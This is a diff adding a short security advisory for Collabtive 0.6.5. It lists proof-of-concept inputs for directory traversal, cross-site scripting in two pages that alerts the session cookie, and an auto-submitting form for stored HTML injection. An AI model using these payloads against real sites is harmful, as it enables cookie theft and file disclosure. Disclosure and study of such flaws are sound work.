@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/47105/info
+
+Collabtive is prone to multiple remote input-validation vulnerabilities including cross-site scripting, HTML-injection, and directory-traversal issues.
+
+Attackers can exploit these issues to obtain sensitive information, execute arbitrary script code, and steal cookie-based authentication credentials.
+
+Collabtive 0.6.5 is vulnerable; other versions may also be affected. 
+
+Directory Traversal:
+
+http://www.example.com/thumb.php?pic=./../../../../../tmp/photo.jpg
+
+Cross-site Scripting:
+
+http://www.example.com/managetimetracker.php?action=editform&tid=1&id=1"><script>alert(document.cookie)</script>
+http://www.example.com/manageuser.php?action=profile&id=1"><script>alert(document.cookie)</script>
+
+
+HTML-injection:
+
+<form action="http://www.example.com/manageproject.php?action=edit&id=1" method="post" name="main">
+<input type="hidden" name="name" value=&#039;test"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="desc" value="Description">
+<input type="hidden" name="end" value="16.03.2011">
+</form>
+<script>
+document.main.submit();
+</script>
+
